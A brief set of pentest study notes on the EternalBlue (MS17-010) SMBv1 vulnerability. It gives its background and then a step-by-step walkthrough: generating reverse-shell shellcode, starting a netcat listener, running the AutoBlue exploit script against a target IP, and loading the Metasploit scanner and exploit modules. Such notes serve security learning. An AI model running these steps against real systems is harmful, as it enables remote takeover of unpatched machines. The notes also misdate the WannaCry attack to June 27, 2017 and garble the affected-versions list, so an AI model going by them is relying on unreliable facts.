
### What is Eternal Blue ?

- EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.

- The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017.

- The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBV1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands. 

### Where was it used ?

- The EternalBlue exploit was used in the WannaCry ransomware attack on June 27,2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.

- This vulnerability affects multiple versions of Windows:
	+ Windows Vista
	+ Windows 7
	+ Windows Server 2008 1
	+ Windows 8.1

### How can it be exploited ?

- Microsoft released a patch for the vulnerability in March, 2017, however, many users and companies have still not yet patched their systems.

- The EternalBlue exploit has a MSF auxiliary module that can be used to check if a target system if vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.

- The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system. 

- In addition to MSF modules, we can also manually exploit the vulnerability by utilizing publicly available exploit code. 

### Manual exploitation of `EternalBlue` with `AutoBlue`

https://github.com/3ndG4me/AutoBlue-MS17-010/

*Git Clone the repository and install the necessary requirements.*

**Steps-**

1. Generate the shellcode
	+ Provide executable permission to the bash script ``/shellcode/shell_prep.sh`
	+ Run the script  `./shell_prep.sh`
	+ Choose to either use `msfvenom` to generate a shellcode, or use our own.  
	+ Specify the required parameters, LPORT, LHOST etc. 
2. Set up a `netcat` listener on the LPORT we specified in the payload.
	- Run the command ``nc -lnvp <port>``
1. Begin exploitation
	+ Select the appropriate exploit Python file based on the version of Windows.
	+ Give the Python file executable permissions. ``chmod +x eternalblue_exploit7.py``
	+ Run the Python file 
	`python eternalblue_exploit7.py <target-ip> <shellcode-path> `
	- We should now get a command shell in the `netcat` listener.

### Automatic exploitation with `metasploit`

- Scan if the system is vulnerable to RCE using EternalBlue
```
use auxiliary/scanner/smb/smb_ms17_010
```
- Module to use for exploitation
```
use exploit/windows/smb/ms17_010_eternalblue
```
